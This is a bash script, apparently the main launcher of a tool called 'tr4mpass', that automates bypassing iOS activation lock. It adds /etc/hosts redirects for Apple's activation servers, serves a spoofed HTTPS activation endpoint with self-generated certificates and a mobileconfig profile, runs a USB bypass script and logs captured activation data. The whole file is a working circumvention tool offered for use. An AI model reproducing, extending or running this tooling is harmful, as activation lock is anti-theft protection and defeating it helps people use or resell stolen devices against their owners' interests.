#!/usr/bin/env bash
#
# run_bypass.sh -- One-command iOS activation bypass.
#
# Orchestrates the full flow:
#   1. Generate TLS certs if missing
#   2. Build mobileconfig profile if missing
#   3. Add /etc/hosts redirects for Apple activation servers
#   4. Start HTTPS activation server on ports 80 + 443
#   5. Wait for device and run USB bypass
#   6. Verify result
#   7. Clean up /etc/hosts
#   8. Stop server
#
# Requires: sudo (for /etc/hosts and privileged ports)
# Requires: libimobiledevice tools OR pymobiledevice3
#
# Usage:
#   sudo ./run_bypass.sh
#

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SERVER_DIR="$SCRIPT_DIR/server"
CERTS_DIR="$SCRIPT_DIR/certs"
PAYLOADS_DIR="$SCRIPT_DIR/payloads"

# PIDs to track for cleanup
SERVER_PID=""

# -- Helpers ----------------------------------------------------------------

log() {
    echo "[$(date '+%H:%M:%S')] $*"
}

die() {
    echo "[ERROR] $*" >&2
    cleanup
    exit 1
}

# -- Cleanup (always runs) -------------------------------------------------

cleanup() {
    log "Cleaning up..."

    # Stop HTTPS server
    if [ -n "${SERVER_PID:-}" ] && kill -0 "$SERVER_PID" 2>/dev/null; then
        log "Stopping HTTPS server (PID $SERVER_PID)"
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi

    # Remove /etc/hosts entries
    log "Removing /etc/hosts redirects"
    python3 "$SERVER_DIR/hosts_manager.py" remove 2>/dev/null || true

    # Flush DNS cache so system picks up original hosts immediately
    if command -v dscacheutil >/dev/null 2>&1; then
        dscacheutil -flushcache 2>/dev/null || true
    fi
    if command -v killall >/dev/null 2>&1; then
        killall -HUP mDNSResponder 2>/dev/null || true
    fi

    log "Cleanup complete"
}

trap cleanup EXIT

# -- Preflight checks -------------------------------------------------------

log "=== tr4mpass -- Automated USB Bypass ==="
echo ""

# Must be root for /etc/hosts and port 443
if [ "$(id -u)" -ne 0 ]; then
    die "This script must be run as root. Use: sudo $0"
fi

# Check for Python 3
if ! command -v python3 >/dev/null 2>&1; then
    die "Python 3 is required but not found"
fi

# Check for libimobiledevice or pymobiledevice3
HAS_TOOLS=0
if command -v idevice_id >/dev/null 2>&1; then
    HAS_TOOLS=1
    log "Found: libimobiledevice tools"
fi
if python3 -c "import pymobiledevice3" 2>/dev/null; then
    HAS_TOOLS=1
    log "Found: pymobiledevice3"
fi
if [ "$HAS_TOOLS" -eq 0 ]; then
    die "No USB tools found. Install libimobiledevice (brew install libimobiledevice libideviceactivation) or pymobiledevice3 (pip install pymobiledevice3)"
fi

# -- Step 1: Generate certs if missing -------------------------------------

if [ ! -f "$CERTS_DIR/server.crt" ] || [ ! -f "$CERTS_DIR/server.key" ]; then
    log "Generating TLS certificates..."
    if [ -x "$CERTS_DIR/generate_ca.sh" ]; then
        (cd "$CERTS_DIR" && bash generate_ca.sh)
    else
        die "Certificate generator not found at $CERTS_DIR/generate_ca.sh"
    fi
else
    log "TLS certificates present"
fi

# -- Step 2: Build profile if missing --------------------------------------

if [ ! -f "$PAYLOADS_DIR/network.mobileconfig" ]; then
    log "Building mobileconfig profile..."
    if [ -f "$PAYLOADS_DIR/build_profile.py" ]; then
        python3 "$PAYLOADS_DIR/build_profile.py"
    else
        log "WARNING: build_profile.py not found, profile will not be served"
    fi
else
    log "Mobileconfig profile present"
fi

# -- Step 3: Add /etc/hosts redirects --------------------------------------

log "Adding /etc/hosts redirects for Apple activation servers..."
python3 "$SERVER_DIR/hosts_manager.py" add || die "Failed to modify /etc/hosts"

# Flush DNS cache
if command -v dscacheutil >/dev/null 2>&1; then
    dscacheutil -flushcache 2>/dev/null || true
fi
if command -v killall >/dev/null 2>&1; then
    killall -HUP mDNSResponder 2>/dev/null || true
fi
log "DNS cache flushed"

# -- Step 4: Start HTTPS server -------------------------------------------

log "Starting HTTPS activation server (ports 80 + 443)..."
python3 "$SERVER_DIR/portal_https.py" &
SERVER_PID=$!

# Wait for server to initialize
sleep 2

if ! kill -0 "$SERVER_PID" 2>/dev/null; then
    die "HTTPS server failed to start"
fi
log "HTTPS server running (PID $SERVER_PID)"

# Quick sanity check -- verify HTTP is responding
if command -v curl >/dev/null 2>&1; then
    HTTP_CHECK=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1/" 2>/dev/null || echo "000")
    if [ "$HTTP_CHECK" = "200" ]; then
        log "HTTP server responding (200 OK)"
    else
        log "WARNING: HTTP server returned $HTTP_CHECK (may still work)"
    fi
fi

# -- Step 5: Run USB bypass ------------------------------------------------

echo ""
log "=== Starting USB bypass flow ==="
echo ""

python3 "$SERVER_DIR/usb_bypass.py"
BYPASS_EXIT=$?

# -- Step 6: Report result -------------------------------------------------

echo ""
if [ "$BYPASS_EXIT" -eq 0 ]; then
    log "=== BYPASS SUCCESSFUL ==="
else
    log "=== BYPASS INCOMPLETE ==="
    log "Check $SERVER_DIR/access.log for request details"
    log "Check $SERVER_DIR/requests/ for captured activation data"
fi

# Cleanup runs via EXIT trap
exit "$BYPASS_EXIT"
